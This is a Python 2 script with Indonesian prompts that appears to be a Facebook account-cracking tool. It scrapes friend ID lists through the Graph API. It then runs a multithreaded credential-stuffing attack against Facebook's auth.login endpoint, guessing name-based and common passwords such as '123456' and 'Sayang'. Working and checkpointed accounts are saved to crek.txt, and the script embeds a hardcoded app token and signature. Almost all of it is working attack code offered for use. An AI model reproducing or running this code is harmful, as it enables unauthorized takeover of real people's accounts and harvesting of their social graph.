	jalan ('\x1b[1;95m • \x1b[1;96mLama Hasil\x1b[1;93m?\x1b[1;96m Hidupkan \x1b[1;92mMode Pesawat \x1b[1;93m3 \x1b[1;92mDetik')
	jalan ('\x1b[1;95m • \x1b[1;96mUntuk Menghentikan Proses\x1b[1;91m,\x1b[1;96m Tekan \x1b[1;92mCTRL+z')
	print 48 * '\x1b[1;91m\xe2\x94\x80'
	
	def main(arg):
		user=arg
		uid,name=user.split("|")
		try:
			sys.stdout.write("\r{}".format(datetime.now().strftime("\033[1;96m%H\033[1;91m:\033[1;96m%M\033[1;91m:\033[1;96m%S")));sys.stdout.flush()
			os.mkdir('done')
		except OSError:
			pass
		try:
		    pass1=name+'123'
		    q = requests.get("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email=" + uid + "&locale=en_US&password=" + pass1 + "&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6", headers=header).text
		    d=json.loads(q)
		    if 'www.facebook.com' in d['error_msg']:
		        print("\x1b[1;93m |akun-cp|"+uid+"|"+pass1)
		        cp=open("crek.txt","a")
		        cp.write("\n akun-cp|"+uid+"|"+pass1)
		        cp.close()
		        cps.append(uid + pass1)
		    else:
		    	if "access_token" in d:
		            print("\x1b[1;92m |akun-ok|"+uid+"|"+pass1)
		            ok=open("crek.txt","a")
		            ok.write("\n akun-ok|"+uid+"|"+pass1)
		            ok.close()
		            oks.append(uid + pass1)
		        else:
		            pass2='786786'
		            q = requests.get("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email=" + uid + "&locale=en_US&password=" + pass2 + "&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6", headers=header).text
		            d=json.loads(q)
		            if 'www.facebook.com' in d['error_msg']:
		                print(" \x1b[1;93m|akun-cp|"+uid+"|"+pass2)
		                cp=open("crek.txt","a")
		                cp.write("\n akun-cp|"+uid+"|"+pass2)
		                cp.close()
		                cps.append(uid + pass2)
		            else:
		                if 'access_token' in d:
		                    print("\x1b[1;92m |akun-ok|"+uid+"|"+pass2)
		                    ok=open("crek.txt","a")
		                    ok.write("\n akun-ok|"+uid+"|"+pass2)
		                    ok.close()
		                    oks.append(uid + pass2)
		                else:
		                    pass3=name+'12345'
		                    q = requests.get("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email=" + uid + "&locale=en_US&password=" + pass3 + "&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6", headers=header).text
		                    d=json.loads(q)
		                    if 'www.facebook.com' in d['error_msg']:
		                        print("\x1b[1;93m |akun-cp|"+uid+"|"+pass3)
		                        cp=open("crek.txt","a")
		                        cp.write("\n akun-cp|"+uid+"|"+pass3)
		                        cp.close()
		                        cps.append(uid + pass3)
		                    else:
		                        if 'access_token' in d:
		                            print("\x1b[1;92m |akun-ok|"+uid+"|"+pass3)
		                            ok=open("crek.txt","a")
		                            ok.write("\n akun-ok|"+uid+"|"+pass3)
		                            ok.close()
		                            oks.append(uid + pass3)
		                        else:
		                            pass4='Sayang'
		                            q = requests.get("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email=" + uid + "&locale=en_US&password=" + pass4 + "&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6", headers=header).text
		                            d=json.loads(q)
		                            if 'www.facebook.com' in d['error_msg']:
		                                print(" \x1b[1;93m|akun-cp|"+uid+"|"+pass4)
		                                cp=open("crek.txt","a")
		                                cp.write("\n akun-cp|"+uid+"|"+pass4)
		                                cp.close()
		                                cps.append(uid + pass4)
		                            else:
		                                if 'access_token' in d:
		                                    print("\x1b[1;92m |akun-ok|"+uid+"|"+pass4)
		                                    ok=open("crek.txt","a")
		                                    ok.write("\n akun-ok|"+uid+"|"+pass4)
		                                    ok.close()
		                                    oks.append(uid + pass4)
		                                else:
		                                    pass5='123456'
		                                    q = requests.get("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email=" + uid + "&locale=en_US&password=" + pass5 + "&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6", headers=header).text
		                                    d=json.loads(q)
		                                    if 'www.facebook.com' in d['error_msg']:
		                                        print(" \x1b[1;93m|akun-cp|"+uid+"|"+pass5)
		                                        cp=open("crek.txt","a")
		                                        cp.write("\n akun-cp|"+uid+"|"+pass5)
		                                        cp.close()
		                                        cps.append(uid + pass5)
		                                    else:
		                                        if 'access_token' in d:
		                                            print("\x1b[1;92m |akun-ok|"+uid+"|"+pass5)
		                                            ok=open("crek.txt","a")
		                                            ok.write("\n akun-ok|"+uid+"|"+pass5)
		                                            ok.close()
		                                            oks.append(uid + pass5)
		                                        else:
		                                            pass6='Anjing'
		                                            q = requests.get("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email=" + uid + "&locale=en_US&password=" + pass6 + "&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6", headers=header).text
		                                            d=json.loads(q)
		                                            if 'www.facebook.com' in d['error_msg']:
		                                                print("\x1b[1;93m |akun-cp|"+uid+"|"+pass6)
		                                                cp=open("crek.txt","a")
		                                                cp.write("\n akun-cp|"+uid+"|"+pass6)
		                                                cp.close()
		                                                cps.append(uid + pass6)
		                                            else:
		                                                if 'access_token' in d:
		                                                    print("\x1b[1;92m |akun-ok|"+uid+"|"+pass6)
		                                                    ok=open("crek.txt","a")
		                                                    ok.write("\n akun-ok|"+uid+"|"+pass6)
		                                                    ok.close()
		                                                    oks.append(uid + pass6)
		                                                else:
		                                                    pass7='000786'
		                                                    q = requests.get("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email=" + uid + "&locale=en_US&password=" + pass2 + "&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6", headers=header).text
		                                                    d=json.loads(q)
		                                                    if 'www.facebook.com' in d['error_msg']:
		                                                        print("\x1b[1;93m |akun-cp|"+uid+"|"+pass7)
		                                                        cp=open("crek.txt","a")
		                                                        cp.write("\n akun-cp|"+uid+"|"+pass7)
		                                                        cp.close()
		                                                        cps.append(uid + pass7)
		                                                    else:
		                                                        if 'access_token' in d:
		                                                            print("\x1b[1;92m |akun-ok|"+uid+"|"+pass7)
		                                                            ok=open("crek.txt","a")
		                                                            ok.write("\n akun-ok|"+uid+"|"+pass7)
		                                                            ok.close()
		                                                            oks.append(uid + pass7)
															
		except:
			pass
		
	p = ThreadPool(30)
	p.map(main,id)
	print '\n\x1b[1;91m────────────────────────────────────────────────'
	print('\033[1;37m [\033[1;32m✓\033[1;37m] \033[1;36mProses selesai...')
	print('\033[1;37m [\033[1;32m✓\033[1;37m] \033[1;36mTotal \033[1;33mCP\033[1;37m/\033[1;32mOK:\033[1;33m '+str(len(cps))+'\033[1;37m/\033[1;32m'+str(len(oks)))
	print(' \033[1;37m[\033[1;32m✓\033[1;37m] \033[1;36mAkun tersimpan di \033[1;32mcrek.txt ')
	print 48 * '\x1b[1;91m\xe2\x94\x80'
	raw_input('\033[1;31m Kembali ')
	rom_menu()
#def romi_afrzl():
	#os.system('clear')
	#print logo
	#jalan(' \033[1;32mAnda Akan Di Arahkan Ke Facebook ')
	#os.system('xdg-open https://www.facebook.com/romi.29.04.03')
	#os.system('python2 indo.so')
def update():
	os.system("echo -e '\n\n\t  SEDANG MENGUPDATE TOOLS\n ' | lolcat")
	os.system("""pkg update && pkg upgrade
pkg install python2
apt install python2
pip install --upgrade pip
git pull origin master
clear
git pull
python2 indo.so""")

def dump():
    os.system('clear')
    try:
        toket = open('login.txt', 'r').read()
    except IOError:
        print ' \x1b[1;91mToken invalid '
        os.system('rm -rf login.txt')
        time.sleep(0.01)
        login()

    os.system('clear')
    os.system('echo " \xe2\x80\xa2\xe2\x80\xa2\xe2\x80\xa2\n  ___  _   _ __  __ ___ \n |   \\| | | |  \\/  | _ \\ \n | |) | |_| | |\\/| |  _/ \n |___/ \\___/|_|  |_|_|  \n\n \xe2\x80\xa2\xe2\x80\xa2\xe2\x80\xa2" | lolcat ')
    print 48 * '\x1b[1;91m\xe2\x94\x80'
    print '\x1b[1;94m [\x1b[1;97m1\x1b[1;94m] \x1b[1;96mDump ID Dari Daftar Teman '
    print '\x1b[1;94m [\x1b[1;97m2\x1b[1;94m] \x1b[1;96mDump ID Dari Teman/Publik '
    print '\x1b[1;94m [\x1b[1;91m0\x1b[1;94m] \x1b[1;91mBack '
    print 48 * '\x1b[1;91m\xe2\x94\x80'
    dump_pilih()
def dump_pilih():
    rom = raw_input(" \x1b[1;96mzuck\x1b[1;91m/\x1b[1;94m>\x1b[1;93m ")
    idfromteman = []
    idteman = []
    if rom == '':
        print ' \x1b[1;91mIsi Yg Benar Sayang!'
        dump_pilih()
    elif rom == '1' or rom == '01':
        id_teman()
    elif rom == '2' or rom == '02':
        idfrom_teman()
    elif rom == '0' or rom == '00':
        rom_menu()
    else:
        print '\x1b[1;91m Isi Yg Benar SayangKu!'
        dump_pilih()
def fbme():
	os.system('clear')
	print logo 
	jalan (' \x1b[1;93mAnda Akan Di Arahkan Ke Facebook')
	jalan (' Jangan Lupa Add/Follow Facebook Saya hehe')
	os.system('xdg-open https://www.facebook.com/romi.29.04.03')
	os.system('python2 indo.so')
def id_teman():
    os.system('clear')
    try:
        toket = open('login.txt', 'r').read()
    except IOError:
        print ' \x1b[1;91mToken invalid'
        os.system('rm -rf login.txt')
        time.sleep(0.01)
        masuk()

    try:
        os.mkdir('out')
    except OSError:
        pass

    try:
        os.system('clear')
        os.system('echo " \xe2\x80\xa2\xe2\x80\xa2\xe2\x80\xa2\n  ___  _   _ __  __ ___ \n |   \\| | | |  \\/  | _ \\ \n | |) | |_| | |\\/| |  _/ \n |___/ \\___/|_|  |_|_|  \n\n \xe2\x80\xa2\xe2\x80\xa2\xe2\x80\xa2" | lolcat ')
        print 48 * '\x1b[1;91m\xe2\x94\x80'
        r = requests.get('https://graph.facebook.com/me/friends?access_token=' + token)
        z = json.loads(r.text)
        jalan('\x1b[1;95m \xe2\x80\xa2 \x1b[1;91mMengambil semua ID Teman \x1b[1;97m...')
        print 48 * '\x1b[1;91m\xe2\x94\x80'
        bz = open('out/id_teman.txt', 'w')
        for a in z['data']:
            idteman.append(a['id'])
            bz.write(a['id'] + '\n')
            print '\r\x1b[1;95m \xe2\x80\xa2 \x1b[1;93m' + str(len(idteman)) + '\x1b[1;93m -> ',
            sys.stdout.flush()
            time.sleep(0.0050)
            print '\x1b[1;92m' + a['id']

        bz.close()
        print '\n\x1b[1;93m [\x1b[1;92m\xe2\x9c\x93\x1b[1;93m] \x1b[1;92mSukses Mengambil ID '
        print '\r\x1b[1;93m [\x1b[1;92m\xe2\x80\xa2\x1b[1;93m] \x1b[1;92mTotal ID\x1b[1;91m :\x1b[1;92m %s' % len(idteman)
        done = raw_input('\r\x1b[1;93m [\x1b[1;92m\xe2\x80\xa2\x1b[1;93m] \x1b[1;92mSimpan Nama File\x1b[1;91m : \x1b[1;92m')
        os.rename('out/id_teman.txt', 'out/' + done)
        print '\r\x1b[1;93m [\x1b[1;92m\xe2\x80\xa2\x1b[1;93m] \x1b[1;92mFile tersimpan \x1b[1;91m: \x1b[1;92mout/' + done
        raw_input('\n \x1b[1;91mKembali')
        dump()
    except IOError:
        print '\x1b[1;91m Gagal membuat file'
        raw_input('\n \x1b[1;91mKembali')
        dump()
    except (KeyboardInterrupt, EOFError):
        print '\x1b[1;91m Terhenti ! '
        raw_input('\n \x1b[1;91mKembali')
        dump()
    except KeyError:
        print '\x1b[1;91m Gagal '
        raw_input('\n \x1b[1;91mKembali')
        dump()
    except OSError:
        print '\x1b[1;91m File anda tidak tersimpan !'
        raw_input('\n\x1b[1;91m Kembali')
        dump()
    except requests.exceptions.ConnectionError:
        print '\x1b[1;91m Tidak ada koneksi !'
        os.sys.exit()
def idfrom_teman():
    os.system('clear')
    try:
        toket = open('login.txt', 'r').read()
    except IOError:
        print ' \x1b[1;91mToken Invalid'
        os.system('rm -rf login.txt')
        time.sleep(0.01)
        masuk()
        
    try:
        os.mkdir('out')
    except OSError:
        pass
        
    try:
        os.system('clear')
        os.system('echo " \xe2\x80\xa2\xe2\x80\xa2\xe2\x80\xa2\n  ___  _   _ __  __ ___ \n |   \\| | | |  \\/  | _ \\ \n | |) | |_| | |\\/| |  _/ \n |___/ \\___/|_|  |_|_|  \n\n \xe2\x80\xa2\xe2\x80\xa2\xe2\x80\xa2" | lolcat ')
        print 48* '\x1b[1;97m═'
        idt = raw_input(' User ID Target : ')
        try:
            jok = requests.get('https://graph.facebook.com/' + idt + '?access_token=' + toket)
            op = json.loads(jok.text)
            print ' Nama Akun      : ' + op['name']
        except KeyError:
            print ' \x1b[1;91mID Publik Tidak Ada !'
            raw_input('\n\x1b[1;91m Kembali')
            dump()

        r = requests.get('https://graph.facebook.com/' + idt + '?fields=friends.limit(50000)&access_token=' + toket)
        z = json.loads(r.text)
        jalan('\x1b[1;95m \xe2\x80\xa2 \x1b[1;91mMengambil semua ID Teman \x1b[1;97m...')
        print ' '
        bz = open('out/id_teman_from_teman.txt', 'w')
        for a in z['friends']['data']:
            idfromteman.append(a['id'])
            bz.write(a['id'] + '\n')
            print '\r\x1b[1;95m \xe2\x80\xa2 \x1b[1;93m' + str(len(idfromteman)) + '\x1b[1;93m -> ',
            sys.stdout.flush()
            time.sleep(0.0050)
            print '\x1b[1;92m' + a['id']

        bz.close()
        print '\n\x1b[1;93m [\x1b[1;92m\xe2\x9c\x93\x1b[1;93m] \x1b[1;92mSukses Mengambil ID '
        print '\r\x1b[1;93m [\x1b[1;92m\xe2\x80\xa2\x1b[1;93m] \x1b[1;92mTotal ID\x1b[1;91m :\x1b[1;92m %s' % len(idfromteman)
        done = raw_input('\r\x1b[1;93m [\x1b[1;92m\xe2\x80\xa2\x1b[1;93m] \x1b[1;92mSimpan Nama File\x1b[1;91m : \x1b[1;92m')
        os.rename('out/id_teman_from_teman.txt', 'out/' + done)
        print '\r\x1b[1;93m [\x1b[1;92m\xe2\x80\xa2\x1b[1;93m] \x1b[1;92mFile tersimpan \x1b[1;91m: \x1b[1;92mout/' + done
        raw_input('\n\x1b[1;91m Kembali')
        dump()
    except OSError:
        print '\x1b[1;91m File tidak tersimpan '
        raw_input('\n\x1b[1;91m Kembali')
        dump()
    except IOError:
        print '\x1b[1;91m Gagal membuat file'
        raw_input('\n\x1b[1;91m Kembali')
        dump()
    except (KeyboardInterrupt, EOFError):
        print '\x1b[1;91m Terhenti '
        raw_input('\n\x1b[1;91m Kembali')
        dump()
    except KeyError:
        print '\x1b[1;91m Gagal '
        raw_input('\x1b[1;91m Kembali')
        dump()
    except requests.exceptions.ConnectionError:
        print '\n\x1b[1;91m Tidak ada koneksi !'
        os.sys.exit()

if __name__ == '__main__':
	#license_rom()
	rom_menu()
	
	
# Yah kena dec-_  ok gpp lu Recode tapi cantumkan nama pembuatnya bro :)
